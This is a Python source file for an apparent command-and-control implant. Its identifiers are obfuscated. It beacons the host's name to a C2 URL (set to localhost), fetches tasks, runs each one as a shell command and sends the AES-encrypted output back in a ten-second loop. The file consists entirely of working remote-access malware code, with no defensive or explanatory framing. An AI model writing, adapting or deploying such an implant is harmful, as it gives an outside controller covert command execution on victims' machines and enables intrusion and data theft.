
import requests
import socket
import time
import subprocess
import json
import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
from crypto import aes_encrypt

C2_URL = "http://localhost:8080/beacon"
RESULT_URL = "http://localhost:8080/result"

def QtEuKvTs():
    dtyIUgvM = socket.gethostname()

    while True:
        YCCUqqRL = {
            "hostname": dtyIUgvM,
            "payload": "idle"
        }

        try:
            GUhsuDLV = json.dumps(YCCUqqRL)
            mReefOAK = aes_encrypt(GUhsuDLV)
            SEAbzYHk = requests.post(C2_URL, data=mReefOAK.encode(), timeout=5)

            if SEAbzYHk.status_code == 200:
                frAIJxJn = SEAbzYHk.json()
                ZIXdodRK = frAIJxJn.get("tasks", [])

                for qWQnqlve in ZIXdodRK:
                    print(f"[+] Executing: {qWQnqlve}")
                    try:
                        KCGjcVjn = subprocess.check_output(qWQnqlve, shell=True, stderr=subprocess.STDOUT, timeout=10)
                        PMonwHOt = KCGjcVjn.decode().strip()
                    except subprocess.CalledProcessError as e:
                        PMonwHOt = f"[!] Command failed: {e.output.decode().strip()}"

                    print(f"[>] Sending result:\n{PMonwHOt}")

                    nJkqvyXT = {
                        "hostname": dtyIUgvM,
                        "command": qWQnqlve,
                        "result": PMonwHOt
                    }
                    QfuoSEdF = aes_encrypt(json.dumps(nJkqvyXT))
                    requests.post(RESULT_URL, data=QfuoSEdF.encode())

        except Exception as e:
            print(f"[!] Beacon failed: {e}")

        time.sleep(10)

if __name__ == "__main__":
    QtEuKvTs()
